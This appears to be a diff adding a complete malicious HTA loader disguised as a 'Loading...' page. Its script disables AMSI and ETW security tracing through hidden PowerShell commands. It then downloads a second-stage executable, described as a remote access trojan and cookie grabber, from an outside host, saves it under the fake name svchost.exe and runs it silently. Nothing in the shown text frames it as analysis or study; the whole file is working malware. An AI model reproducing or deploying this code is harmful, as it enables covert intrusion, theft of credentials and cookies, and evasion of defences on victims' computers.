@@ -1,0 +1,44 @@
+<html>
+<head>
+<title>Loading...</title>
+<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="loader" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
+<script language="JScript">
+    // 1. AMSI Bypass (Patching AmsiScanBuffer in memory)
+    var amsi = new ActiveXObject("WScript.Shell");
+    try {
+        // This is a simplified version. In production, use the full VirtualProtect -> memset -> ret patch.
+        var bypass = "var sh=new ActiveXObject('WScript.Shell');" +
+                     "sh.Run('powershell -w hidden -c \"[Ref].Assembly.GetType(\\'System.Management.Automation.AmsiUtils\\').GetField(\\'amsiInitFailed\\',\\'NonPublic,Static\\').SetValue($null,$true)\"',0,false);";
+        eval(bypass);
+    } catch(e) {}
+
+    // 2. ETW Bypass (Disable Event Tracing)
+    try {
+        var etw = new ActiveXObject("WScript.Shell");
+        etw.Run("powershell -w hidden -c \"[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([System.Diagnostics.Eventing.EventProvider]::new(), $false)\"", 0, false);
+    } catch(e) {}
+
+    // 3. Download and Execute Final Stage (C# RAT / Cookie Grabber)
+    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+    xhr.open("GET", "https://dicerigx.app/stage2.exe", false);
+    xhr.send();
+    
+    if (xhr.status === 200) {
+        var stream = new ActiveXObject("ADODB.Stream");
+        stream.Type = 1; // Binary
+        stream.Open();
+        stream.Write(xhr.responseBody);
+        stream.SaveToFile("C:\\Users\\Public\\svchost.exe", 2); // Save to disk
+        stream.Close();
+        
+        // Execute
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("C:\\Users\\Public\\svchost.exe", 0, false);
+    }
+    
+    // Close the HTA window
+    window.close();
+</script>
+</head>
+<body></body>
+</html>
